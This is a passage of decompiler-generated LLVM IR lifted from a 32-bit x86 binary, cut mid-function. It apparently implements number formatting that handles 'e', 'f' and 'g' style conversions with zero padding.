  br i1 %v7_8054cd3, label %dec_label_pc_8054cd5, label %dec_label_pc_8054cac.dec_label_pc_8054cac_crit_edge

dec_label_pc_8054cac.dec_label_pc_8054cac_crit_edge: ; preds = %dec_label_pc_8054cac
  %v0_8054cb0.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_8054cc0.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054cac

dec_label_pc_8054cd5:                             ; preds = %dec_label_pc_8054cac
  %v0_8054cd5 = load i32, i32* @edi, align 4
  %v1_8054cd5 = add i32 %v0_8054cd5, 1
  store i32 %v1_8054cd5, i32* @edi, align 4
  %v7_8054cd9 = icmp sgt i32 %v1_8054cd5, 2
  br i1 %v7_8054cd9, label %dec_label_pc_8054cdb, label %dec_label_pc_8054cd5.dec_label_pc_8054c83_crit_edge

dec_label_pc_8054cd5.dec_label_pc_8054c83_crit_edge: ; preds = %dec_label_pc_8054cd5
  %v0_8054c83.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_8054c83.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_8054ca8.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8054c83

dec_label_pc_8054cdb:                             ; preds = %dec_label_pc_8054cd5
  %v0_8054cdb = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8054cdb = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_8054cdb, x86_fp80* %st0.global-to-local, align 4
  %v2_8054cdd = add i3 %v0_8054cdb, 2
  store i3 %v2_8054cdd, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8054cdf = add i8 %stack_var_-207.0, -96
  %v6_8054cdf = sub i8 95, %stack_var_-207.0
  %v7_8054cdf = and i8 %v6_8054cdf, %stack_var_-207.0
  %v8_8054cdf = icmp slt i8 %v7_8054cdf, 0
  %v9_8054cdf = icmp eq i8 %v4_8054cdf, 0
  %v10_8054cdf = icmp slt i8 %v4_8054cdf, 0
  %v3_8054ce4 = icmp eq i1 %v10_8054cdf, %v8_8054cdf
  %v4_8054ce4 = icmp eq i1 %v9_8054cdf, false
  %v5_8054ce4 = and i1 %v4_8054ce4, %v3_8054ce4
  br i1 %v5_8054ce4, label %dec_label_pc_8054cf3, label %dec_label_pc_8054ce6

dec_label_pc_8054ce6:                             ; preds = %dec_label_pc_8054cdb
  %v4_8054ce6 = add i8 %stack_var_-207.0, 32
  br label %dec_label_pc_8054cf3

dec_label_pc_8054cf3:                             ; preds = %dec_label_pc_8054cdb, %dec_label_pc_8054ce6
  %stack_var_-207.1 = phi i8 [ %stack_var_-207.0, %dec_label_pc_8054cdb ], [ %v4_8054ce6, %dec_label_pc_8054ce6 ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_8054cdb ], [ 69, %dec_label_pc_8054ce6 ]
  %v12_8054cf3 = icmp eq i8 %stack_var_-207.1, 103
  %v1_8054cf8 = icmp eq i1 %v12_8054cf3, false
  br i1 %v1_8054cf8, label %dec_label_pc_8054d01, label %dec_label_pc_8054cfa

dec_label_pc_8054cfa:                             ; preds = %dec_label_pc_8054cf3
  %v0_8054cfa = load i32, i32* %ebp.global-to-local, align 4
  %tmp185 = icmp slt i32 %v0_8054cfa, 1
  br i1 %tmp185, label %dec_label_pc_8054d08, label %dec_label_pc_8054cfe

dec_label_pc_8054cfe:                             ; preds = %dec_label_pc_8054cfa
  %v1_8054cfe = add i32 %v0_8054cfa, -1
  store i32 %v1_8054cfe, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054d08

dec_label_pc_8054d01:                             ; preds = %dec_label_pc_8054cf3
  %v12_8054d01 = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v12_8054d01, label %dec_label_pc_8054d0c, label %dec_label_pc_8054d01.dec_label_pc_8054d08_crit_edge

dec_label_pc_8054d01.dec_label_pc_8054d08_crit_edge: ; preds = %dec_label_pc_8054d01
  %v0_8054d08.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054d08

dec_label_pc_8054d08:                             ; preds = %dec_label_pc_8054d01.dec_label_pc_8054d08_crit_edge, %dec_label_pc_8054cfa, %dec_label_pc_8054cfe
  %v0_8054d08 = phi i32 [ %v0_8054d08.pre, %dec_label_pc_8054d01.dec_label_pc_8054d08_crit_edge ], [ %v0_8054cfa, %dec_label_pc_8054cfa ], [ %v1_8054cfe, %dec_label_pc_8054cfe ]
  store i32 %v0_8054d08, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054d39

dec_label_pc_8054d0c:                             ; preds = %dec_label_pc_8054d01
  store i32 %v0_8054d19, i32* %eax.global-to-local, align 4
  %v0_8054d10 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054d10 = add i32 %v0_8054d10, %v0_8054d19
  store i32 %v2_8054d10, i32* %ebx.global-to-local, align 4
  %v5_8054d17 = icmp slt i32 %v2_8054d10, -1
  br i1 %v5_8054d17, label %dec_label_pc_8054d19, label %dec_label_pc_8054d39

dec_label_pc_8054d19:                             ; preds = %dec_label_pc_8054d0c
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054d21 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_8054d21, i32* %eax.global-to-local, align 4
  %v4_8054d29 = bitcast i32* %stack_var_-72 to i8*
  %v5_8054d29 = call i32 @function_8051e84(i8* %v4_8054d29, i32 48, i32 21)
  store i32 %v5_8054d29, i32* %eax.global-to-local, align 4
  %v0_8054d39.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054d39

dec_label_pc_8054d39:                             ; preds = %dec_label_pc_8054d0c, %dec_label_pc_8054d19, %dec_label_pc_8054d08
  %v1_8054d59 = phi i32 [ %v0_8054d08, %dec_label_pc_8054d08 ], [ %v2_8054d10, %dec_label_pc_8054d0c ], [ %v0_8054d39.pr.pre, %dec_label_pc_8054d19 ]
  %stack_var_-220.3 = phi i32 [ %v0_8054d19, %dec_label_pc_8054d08 ], [ %v0_8054d19, %dec_label_pc_8054d0c ], [ -1, %dec_label_pc_8054d19 ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_8054d4c = icmp sgt i32 %v1_8054d59, 20
  br i1 %v7_8054d4c, label %dec_label_pc_8054d4e, label %dec_label_pc_8054d59

dec_label_pc_8054d4e:                             ; preds = %dec_label_pc_8054d39
  %v2_8054d4e = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_8054d4e, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054d6d.preheader

dec_label_pc_8054d59:                             ; preds = %dec_label_pc_8054d39
  %v0_8054d59 = load i32, i32* @esp, align 4
  %v2_8054d59 = add i32 %v1_8054d59, 165
  %v3_8054d59 = add i32 %v2_8054d59, %v0_8054d59
  store i32 %v3_8054d59, i32* %eax.global-to-local, align 4
  %v1_8054d60 = add i32 %v3_8054d59, 2
  %v2_8054d60 = inttoptr i32 %v1_8054d60 to i8*
  %v3_8054d60 = load i8, i8* %v2_8054d60, align 1
  %v4_8054d60 = add i8 %v3_8054d60, -53
  %v9_8054d60 = sub i8 52, %v3_8054d60
  %v10_8054d60 = and i8 %v9_8054d60, %v3_8054d60
  %v11_8054d60 = icmp slt i8 %v10_8054d60, 0
  %v13_8054d60 = icmp slt i8 %v4_8054d60, 0
  store i32 %v1_8054d60, i32* %ecx.global-to-local, align 4
  %v2_8054d67 = icmp eq i1 %v13_8054d60, %v11_8054d60
  %v3_8054d67 = zext i1 %v2_8054d67 to i32
  br label %dec_label_pc_8054d6d.preheader

dec_label_pc_8054d6d.preheader:                   ; preds = %dec_label_pc_8054d59, %dec_label_pc_8054d4e
  %v0_8054d6d101 = phi i32 [ %v1_8054d60, %dec_label_pc_8054d59 ], [ %v2_8054d4e, %dec_label_pc_8054d4e ]
  %storemerge70 = phi i32 [ %v3_8054d67, %dec_label_pc_8054d59 ], [ 0, %dec_label_pc_8054d4e ]
  store i32 %storemerge70, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054d6d

dec_label_pc_8054d6d:                             ; preds = %dec_label_pc_8054d6d.backedge, %dec_label_pc_8054d6d.preheader
  %v3_8054d6e = phi i32 [ %v3_8054d6e.pre, %dec_label_pc_8054d6d.backedge ], [ %storemerge70, %dec_label_pc_8054d6d.preheader ]
  %v0_8054d6d = phi i32 [ %v0_8054d70, %dec_label_pc_8054d6d.backedge ], [ %v0_8054d6d101, %dec_label_pc_8054d6d.preheader ]
  %v1_8054d6d = add i32 %v0_8054d6d, -1
  store i32 %v1_8054d6d, i32* %ecx.global-to-local, align 4
  %v1_8054d6e = inttoptr i32 %v1_8054d6d to i8*
  %v2_8054d6e = load i8, i8* %v1_8054d6e, align 1
  %v4_8054d6e = trunc i32 %v3_8054d6e to i8
  %v5_8054d6e = add i8 %v2_8054d6e, %v4_8054d6e
  store i8 %v5_8054d6e, i8* %v1_8054d6e, align 1
  %v0_8054d70 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8054d70 = inttoptr i32 %v0_8054d70 to i8*
  %v2_8054d70 = load i8, i8* %v1_8054d70, align 1
  %v3_8054d70 = zext i8 %v2_8054d70 to i32
  %v4_8054d70 = load i32, i32* %edx.global-to-local, align 4
  %v5_8054d70 = and i32 %v4_8054d70, -256
  %v6_8054d70 = or i32 %v5_8054d70, %v3_8054d70
  store i32 %v6_8054d70, i32* %edx.global-to-local, align 4
  %v7_8054d72 = icmp eq i8 %v2_8054d70, 48
  br i1 %v7_8054d72, label %dec_label_pc_8054d6d.backedge, label %dec_label_pc_8054d77

dec_label_pc_8054d6d.backedge:                    ; preds = %dec_label_pc_8054d6d, %dec_label_pc_8054d77
  %v3_8054d6e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054d6d

dec_label_pc_8054d77:                             ; preds = %dec_label_pc_8054d6d
  %v2_8054d77 = add i8 %v2_8054d70, -57
  %v7_8054d77 = sub i8 56, %v2_8054d70
  %v8_8054d77 = and i8 %v7_8054d77, %v2_8054d70
  %v9_8054d77 = icmp slt i8 %v8_8054d77, 0
  %v10_8054d77 = icmp eq i8 %v2_8054d77, 0
  %v11_8054d77 = icmp slt i8 %v2_8054d77, 0
  %v3_8054d7a = icmp eq i1 %v11_8054d77, %v9_8054d77
  %v4_8054d7a = icmp eq i1 %v10_8054d77, false
  %v5_8054d7a = and i1 %v4_8054d7a, %v3_8054d7a
  br i1 %v5_8054d7a, label %dec_label_pc_8054d6d.backedge, label %dec_label_pc_8054d7c

dec_label_pc_8054d7c:                             ; preds = %dec_label_pc_8054d77
  %v2_8054d7c = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_8054d7c, i32* %eax.global-to-local, align 4
  %tmp195 = icmp ugt i32 %v0_8054d70, %v2_8054d7c
  store i32 %stack_var_-220.3, i32* %esi.global-to-local, align 4
  br i1 %tmp195, label %dec_label_pc_8054d87, label %dec_label_pc_8054d94

dec_label_pc_8054d87:                             ; preds = %dec_label_pc_8054d7c
  store i32 %v2_8054c63, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054d9d

dec_label_pc_8054d94:                             ; preds = %dec_label_pc_8054d7c
  store i32 %v2_8054d7c, i32* %edx.global-to-local, align 4
  store i32 %v2_8054d7c, i32* %ecx.global-to-local, align 4
  %v1_8054d9c = add i32 %stack_var_-220.3, 1
  store i32 %v1_8054d9c, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054d9d

dec_label_pc_8054d9d:                             ; preds = %dec_label_pc_8054d87, %dec_label_pc_8054d94
  %v0_8054d9d = phi i32 [ %v0_8054d70, %dec_label_pc_8054d87 ], [ %v2_8054d7c, %dec_label_pc_8054d94 ]
  %v1_8054d9d = add i32 %v0_8054d9d, 1
  store i32 %v1_8054d9d, i32* %eax.global-to-local, align 4
  %v2_8054da4 = inttoptr i32 %v1_8054d9d to i8*
  store i8 0, i8* %v2_8054da4, align 1
  br i1 %v1_8054cf8, label %dec_label_pc_8054dca, label %dec_label_pc_8054daf

dec_label_pc_8054daf:                             ; preds = %dec_label_pc_8054d9d
  %v0_8054daf = load i32, i32* %esi.global-to-local, align 4
  %v5_8054db2 = icmp slt i32 %v0_8054daf, -4
  br i1 %v5_8054db2, label %dec_label_pc_8054dd7, label %dec_label_pc_8054db4

dec_label_pc_8054db4:                             ; preds = %dec_label_pc_8054daf
  %v1_8054db4 = load i32, i32* %ebx.global-to-local, align 4
  %v7_8054db6 = icmp slt i32 %v1_8054db4, %v0_8054daf
  br i1 %v7_8054db6, label %dec_label_pc_8054dd7, label %dec_label_pc_8054dbf

dec_label_pc_8054dbf:                             ; preds = %dec_label_pc_8054db4
  %v2_8054dc1 = sub i32 %v1_8054db4, %v0_8054daf
  store i32 %v2_8054dc1, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8054ddb

dec_label_pc_8054dca:                             ; preds = %dec_label_pc_8054d9d
  %v4_8054dca = zext i8 %stack_var_-207.1 to i32
  %v5_8054dca = load i32, i32* %ebx.global-to-local, align 4
  %v6_8054dca = and i32 %v5_8054dca, -256
  %v7_8054dca = or i32 %v6_8054dca, %v4_8054dca
  store i32 %v7_8054dca, i32* %ebx.global-to-local, align 4
  %v10_8054dce = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v10_8054dce, label %dec_label_pc_8054dca.dec_label_pc_8054ddb_crit_edge, label %dec_label_pc_8054dd7

dec_label_pc_8054dca.dec_label_pc_8054ddb_crit_edge: ; preds = %dec_label_pc_8054dca
  %v0_8054ddb.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054ddb

dec_label_pc_8054dd7:                             ; preds = %dec_label_pc_8054daf, %dec_label_pc_8054db4, %dec_label_pc_8054dca
  %stack_var_-197.0 = phi i8 [ %stack_var_-207.1, %dec_label_pc_8054dca ], [ 103, %dec_label_pc_8054db4 ], [ 103, %dec_label_pc_8054daf ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054de5

dec_label_pc_8054ddb:                             ; preds = %dec_label_pc_8054dca.dec_label_pc_8054ddb_crit_edge, %dec_label_pc_8054dbf
  %v0_8054ddd = phi i32 [ %v0_8054ddb.pre, %dec_label_pc_8054dca.dec_label_pc_8054ddb_crit_edge ], [ %v0_8054daf, %dec_label_pc_8054dbf ]
  %stack_var_-197.1 = phi i8 [ %stack_var_-207.1, %dec_label_pc_8054dca.dec_label_pc_8054ddb_crit_edge ], [ 102, %dec_label_pc_8054dbf ]
  %v2_8054ddb = icmp slt i32 %v0_8054ddd, 0
  store i32 %v0_8054ddd, i32* %ebx.global-to-local, align 4
  %v1_8054ddf = icmp eq i1 %v2_8054ddb, false
  br i1 %v1_8054ddf, label %dec_label_pc_8054de5, label %dec_label_pc_8054de1

dec_label_pc_8054de1:                             ; preds = %dec_label_pc_8054ddb
  %v0_8054de1 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054de1 = add i32 %v0_8054de1, -1
  store i32 %v1_8054de1, i32* %edx.global-to-local, align 4
  %v1_8054de2 = inttoptr i32 %v1_8054de1 to i8*
  store i8 48, i8* %v1_8054de2, align 1
  %v0_8054e1a.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054de5

dec_label_pc_8054de5:                             ; preds = %dec_label_pc_8054ddb, %dec_label_pc_8054dd7, %dec_label_pc_8054de1
  %v1_8054e75 = phi i32 [ %v0_8054ddd, %dec_label_pc_8054ddb ], [ %v0_8054e1a.pre, %dec_label_pc_8054de1 ], [ 0, %dec_label_pc_8054dd7 ]
  %stack_var_-197.2 = phi i8 [ %stack_var_-197.1, %dec_label_pc_8054ddb ], [ %stack_var_-197.1, %dec_label_pc_8054de1 ], [ %stack_var_-197.0, %dec_label_pc_8054dd7 ]
  %v2_8054de5 = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_8054de5, i32* %eax.global-to-local, align 4
  %v0_8054df4 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054df4 = add i32 %v0_8054df4, 1
  store i32 %v1_8054df4, i32* %edi.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v1_8054e03 = inttoptr i32 %v0_8054df4 to i8*
  %v2_8054e03 = load i8, i8* %v1_8054e03, align 1
  %v3_8054e03 = zext i8 %v2_8054e03 to i32
  %v5_8054e03 = and i32 %v2_8054de5, -256
  %v6_8054e03 = or i32 %v3_8054e03, %v5_8054e03
  store i32 %v6_8054e03, i32* %eax.global-to-local, align 4
  store i32 %v6_8054e03, i32* %stack_var_-22, align 4
  %v2_8054e18 = sub i32 %v1_8054d9d, %v1_8054df4
  store i32 %v2_8054e18, i32* %edx.global-to-local, align 4
  %v1_8054e1a = icmp eq i32 %v1_8054e75, 0
  %v2_8054e1a = icmp slt i32 %v1_8054e75, 0
  br i1 %v2_8054e1a, label %dec_label_pc_8054e69, label %dec_label_pc_8054e1e

dec_label_pc_8054e1e:                             ; preds = %dec_label_pc_8054de5
  %v2_8054e1e = sub i32 %v1_8054e75, %v2_8054e18
  %v8_8054e1e = xor i32 %v2_8054e18, %v1_8054e75
  %v9_8054e1e = xor i32 %v2_8054e1e, %v1_8054e75
  %v10_8054e1e = and i32 %v9_8054e1e, %v8_8054e1e
  %v11_8054e1e = icmp slt i32 %v10_8054e1e, 0
  %v13_8054e1e = icmp slt i32 %v2_8054e1e, 0
  store i32 112, i32* %stack_var_-144, align 4
  %v2_8054e2c = icmp eq i1 %v13_8054e1e, %v11_8054e1e
  br i1 %v2_8054e2c, label %dec_label_pc_8054e2e, label %dec_label_pc_8054e62

dec_label_pc_8054e2e:                             ; preds = %dec_label_pc_8054e1e
  store i32 %v2_8054e1e, i32* %eax.global-to-local, align 4
  %tmp186 = icmp slt i32 %v2_8054e1e, 1
  %tmp187 = icmp eq i1 %tmp186, false
  br i1 %tmp187, label %dec_label_pc_8054e43, label %dec_label_pc_8054e5e

dec_label_pc_8054e43:                             ; preds = %dec_label_pc_8054e2e
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_8054e5e

dec_label_pc_8054e5e:                             ; preds = %dec_label_pc_8054e2e, %dec_label_pc_8054e43
  %storemerge27.in = phi i32* [ %stack_var_-120, %dec_label_pc_8054e43 ], [ %stack_var_-132, %dec_label_pc_8054e2e ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge27 = ptrtoint i32* %storemerge27.in to i32
  store i32 %storemerge27, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054e7e

dec_label_pc_8054e62:                             ; preds = %dec_label_pc_8054e1e
  %v4_8054e64 = icmp eq i1 %v1_8054e1a, false
  br i1 %v4_8054e64, label %dec_label_pc_8054e6f, label %dec_label_pc_8054e66

dec_label_pc_8054e66:                             ; preds = %dec_label_pc_8054e62
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054e69

dec_label_pc_8054e69:                             ; preds = %dec_label_pc_8054de5, %dec_label_pc_8054e66
  %v0_8054eb1111 = phi i32 [ %v1_8054e75, %dec_label_pc_8054de5 ], [ -1, %dec_label_pc_8054e66 ]
  %v2_8054e69 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8054e69, i32* @ecx, align 4
  br label %dec_label_pc_8054e7e

dec_label_pc_8054e6f:                             ; preds = %dec_label_pc_8054e62
  %v2_8054e73 = add i32 %v1_8054df4, %v1_8054e75
  store i32 %v2_8054e73, i32* %edi.global-to-local, align 4
  %v2_8054e75 = sub i32 %v2_8054e18, %v1_8054e75
  store i32 %v2_8054e75, i32* %edx.global-to-local, align 4
  %v2_8054e77 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8054e77, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054e7e

dec_label_pc_8054e7e:                             ; preds = %dec_label_pc_8054e69, %dec_label_pc_8054e5e, %dec_label_pc_8054e6f
  %v0_8054eb1110 = phi i32 [ %v0_8054eb1111, %dec_label_pc_8054e69 ], [ -1, %dec_label_pc_8054e5e ], [ -1, %dec_label_pc_8054e6f ]
  %v0_8054e9a = phi i32 [ %v2_8054e69, %dec_label_pc_8054e69 ], [ %storemerge27, %dec_label_pc_8054e5e ], [ %v2_8054e77, %dec_label_pc_8054e6f ]
  %v0_8054e8b = phi i32 [ %v2_8054e18, %dec_label_pc_8054e69 ], [ 0, %dec_label_pc_8054e5e ], [ %v2_8054e75, %dec_label_pc_8054e6f ]
  store i32 %tmp155, i32* %eax.global-to-local, align 4
  %v2_8054e85 = inttoptr i32 %v1_8054afb to i8*
  %v3_8054e85 = load i8, i8* %v2_8054e85, align 1
  %v4_8054e85 = and i8 %v3_8054e85, 16
  %v5_8054e85 = icmp eq i8 %v4_8054e85, 0
  %v1_8054e89 = icmp eq i1 %v5_8054e85, false
  br i1 %v1_8054e89, label %dec_label_pc_8054e9a, label %dec_label_pc_8054e8b

dec_label_pc_8054e8b:                             ; preds = %dec_label_pc_8054e7e
  %v1_8054e8b = icmp eq i32 %v0_8054e8b, 0
  %v1_8054e8d = icmp eq i1 %v1_8054e8b, false
  br i1 %v1_8054e8d, label %dec_label_pc_8054e9a, label %dec_label_pc_8054e8f

dec_label_pc_8054e8f:                             ; preds = %dec_label_pc_8054e8b
  br i1 %v12_8054cf3, label %dec_label_pc_8054eb1, label %dec_label_pc_8054e96

dec_label_pc_8054e96:                             ; preds = %dec_label_pc_8054e8f
  %v0_8054e96 = load i32, i32* %ebp.global-to-local, align 4
  %tmp188 = icmp slt i32 %v0_8054e96, 1
  br i1 %tmp188, label %dec_label_pc_8054eb1, label %dec_label_pc_8054e9a

dec_label_pc_8054e9a:                             ; preds = %dec_label_pc_8054e96, %dec_label_pc_8054e8b, %dec_label_pc_8054e7e
  %v1_8054e9a = inttoptr i32 %v0_8054e9a to i32*
  store i32 112, i32* %v1_8054e9a, align 4
  %v0_8054ea0 = load i32, i32* @ecx, align 4
  %v1_8054ea0 = add i32 %v0_8054ea0, 4
  %v2_8054ea0 = inttoptr i32 %v1_8054ea0 to i32*
  store i32 1, i32* %v2_8054ea0, align 4
  %v0_8054ea7 = load i32, i32* @ecx, align 4
  %v1_8054ea7 = add i32 %v0_8054ea7, 8
  %v2_8054ea7 = inttoptr i32 %v1_8054ea7 to i32*
  store i32 ptrtoint (i32* @global_var_805d320.398 to i32), i32* %v2_8054ea7, align 4
  %v0_8054eae = load i32, i32* @ecx, align 4
  %v1_8054eae = add i32 %v0_8054eae, 12
  store i32 %v1_8054eae, i32* @ecx, align 4
  %v0_8054eb1.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054eb1

dec_label_pc_8054eb1:                             ; preds = %dec_label_pc_8054e96, %dec_label_pc_8054e8f, %dec_label_pc_8054e9a
  %v0_8054eb8 = phi i32 [ %v0_8054e9a, %dec_label_pc_8054e96 ], [ %v0_8054e9a, %dec_label_pc_8054e8f ], [ %v1_8054eae, %dec_label_pc_8054e9a ]
  %v0_8054eb1 = phi i32 [ %v0_8054eb1110, %dec_label_pc_8054e96 ], [ %v0_8054eb1110, %dec_label_pc_8054e8f ], [ %v0_8054eb1.pre, %dec_label_pc_8054e9a ]
  %v1_8054eb1 = add i32 %v0_8054eb1, 1
  %v8_8054eb1 = icmp eq i32 %v1_8054eb1, 0
  store i32 %v1_8054eb1, i32* %ebx.global-to-local, align 4
  br i1 %v8_8054eb1, label %dec_label_pc_8054ecb, label %dec_label_pc_8054eb4

dec_label_pc_8054eb4:                             ; preds = %dec_label_pc_8054eb1
  %v1_8054eb6 = sub i32 -1, %v0_8054eb1
  store i32 %v1_8054eb6, i32* %eax.global-to-local, align 4
  %v1_8054eb8 = inttoptr i32 %v0_8054eb8 to i32*
  store i32 176, i32* %v1_8054eb8, align 4
  %v0_8054ebe = load i32, i32* %eax.global-to-local, align 4
  %v1_8054ebe = load i32, i32* @ecx, align 4
  %v2_8054ebe = add i32 %v1_8054ebe, 4
  %v3_8054ebe = inttoptr i32 %v2_8054ebe to i32*
  store i32 %v0_8054ebe, i32* %v3_8054ebe, align 4
  %v0_8054ec1 = load i32, i32* @ecx, align 4
  %v1_8054ec1 = add i32 %v0_8054ec1, 8
  %v2_8054ec1 = inttoptr i32 %v1_8054ec1 to i32*
  store i32 ptrtoint (i32* @global_var_805d313.397 to i32), i32* %v2_8054ec1, align 4
  %v0_8054ec8 = load i32, i32* @ecx, align 4
  %v1_8054ec8 = add i32 %v0_8054ec8, 12
  store i32 %v1_8054ec8, i32* @ecx, align 4
  br label %dec_label_pc_8054ecb

dec_label_pc_8054ecb:                             ; preds = %dec_label_pc_8054eb1, %dec_label_pc_8054eb4
  %v0_8054ecf = phi i32 [ %v0_8054eb8, %dec_label_pc_8054eb1 ], [ %v1_8054ec8, %dec_label_pc_8054eb4 ]
  %v0_8054ecb = load i32, i32* %edx.global-to-local, align 4
  %v1_8054ecb = icmp eq i32 %v0_8054ecb, 0
  br i1 %v1_8054ecb, label %dec_label_pc_8054ede, label %dec_label_pc_8054ecf

dec_label_pc_8054ecf:                             ; preds = %dec_label_pc_8054ecb
  %v1_8054ecf = inttoptr i32 %v0_8054ecf to i32*
  store i32 112, i32* %v1_8054ecf, align 4
  %v0_8054ed5 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054ed5 = load i32, i32* @ecx, align 4
  %v2_8054ed5 = add i32 %v1_8054ed5, 4
  %v3_8054ed5 = inttoptr i32 %v2_8054ed5 to i32*
  store i32 %v0_8054ed5, i32* %v3_8054ed5, align 4
  %v0_8054ed8 = load i32, i32* %edi.global-to-local, align 4
  %v1_8054ed8 = load i32, i32* @ecx, align 4
  %v2_8054ed8 = add i32 %v1_8054ed8, 8
  %v3_8054ed8 = inttoptr i32 %v2_8054ed8 to i32*
  store i32 %v0_8054ed8, i32* %v3_8054ed8, align 4
  %v0_8054edb = load i32, i32* @ecx, align 4
  %v1_8054edb = add i32 %v0_8054edb, 12
  store i32 %v1_8054edb, i32* @ecx, align 4
  br label %dec_label_pc_8054ede

dec_label_pc_8054ede:                             ; preds = %dec_label_pc_8054ecb, %dec_label_pc_8054ecf
  %v0_8054efc = phi i32 [ %v0_8054ecf, %dec_label_pc_8054ecb ], [ %v1_8054edb, %dec_label_pc_8054ecf ]
  br i1 %v1_8054cf8, label %dec_label_pc_8054ef2, label %dec_label_pc_8054ee5

dec_label_pc_8054ee5:                             ; preds = %dec_label_pc_8054ede
  store i32 %tmp155, i32* %eax.global-to-local, align 4
  %v3_8054eec = load i8, i8* %v2_8054e85, align 1
  %v4_8054eec = and i8 %v3_8054eec, 16
  %v5_8054eec = icmp eq i8 %v4_8054eec, 0
  br i1 %v5_8054eec, label %dec_label_pc_8054f0f, label %dec_label_pc_8054ef2

dec_label_pc_8054ef2:                             ; preds = %dec_label_pc_8054ee5, %dec_label_pc_8054ede
  %v0_8054ef2 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054ef4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054ef4 = sub i32 %v0_8054ef2, %v1_8054ef4
  store i32 %v2_8054ef4, i32* %eax.global-to-local, align 4
  %v1_8054ef6 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8054ef6 = sub i32 %v2_8054ef4, %v1_8054ef6
  %v8_8054ef6 = xor i32 %v1_8054ef6, %v2_8054ef4
  %v9_8054ef6 = xor i32 %v2_8054ef6, %v2_8054ef4
  %v10_8054ef6 = and i32 %v9_8054ef6, %v8_8054ef6
  %v11_8054ef6 = icmp slt i32 %v10_8054ef6, 0
  %v13_8054ef6 = icmp slt i32 %v2_8054ef6, 0
  %v2_8054ef8 = icmp eq i1 %v13_8054ef6, %v11_8054ef6
  br i1 %v2_8054ef8, label %dec_label_pc_8054f0f, label %dec_label_pc_8054efa

dec_label_pc_8054efa:                             ; preds = %dec_label_pc_8054ef2
  %v2_8054efa = sub i32 %v1_8054ef6, %v2_8054ef4
  store i32 %v2_8054efa, i32* %ebp.global-to-local, align 4
  %v1_8054efc = inttoptr i32 %v0_8054efc to i32*
  store i32 176, i32* %v1_8054efc, align 4
  %v0_8054f02 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8054f02 = load i32, i32* @ecx, align 4
  %v2_8054f02 = add i32 %v1_8054f02, 4
  %v3_8054f02 = inttoptr i32 %v2_8054f02 to i32*
  store i32 %v0_8054f02, i32* %v3_8054f02, align 4
  %v0_8054f05 = load i32, i32* @ecx, align 4
  %v1_8054f05 = add i32 %v0_8054f05, 8
  %v2_8054f05 = inttoptr i32 %v1_8054f05 to i32*
  store i32 ptrtoint (i32* @global_var_805d313.397 to i32), i32* %v2_8054f05, align 4
  %v0_8054f0c = load i32, i32* @ecx, align 4
  %v1_8054f0c = add i32 %v0_8054f0c, 12
  store i32 %v1_8054f0c, i32* @ecx, align 4
  br label %dec_label_pc_8054f0f

dec_label_pc_8054f0f:                             ; preds = %dec_label_pc_8054ef2, %dec_label_pc_8054ee5, %dec_label_pc_8054efa
  %v1_8054f97120 = phi i32 [ %v0_8054efc, %dec_label_pc_8054ef2 ], [ %v0_8054efc, %dec_label_pc_8054ee5 ], [ %v1_8054f0c, %dec_label_pc_8054efa ]
  %v12_8054f0f = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_8054f0f, label %dec_label_pc_8054f8a, label %dec_label_pc_8054f16

dec_label_pc_8054f16:                             ; preds = %dec_label_pc_8054f0f
  %v5_8054f16 = load i32, i32* %edx.global-to-local, align 4
  %v6_8054f16 = and i32 %v5_8054f16, -256
  %v7_8054f16 = or i32 %v6_8054f16, %stack_var_-42.0
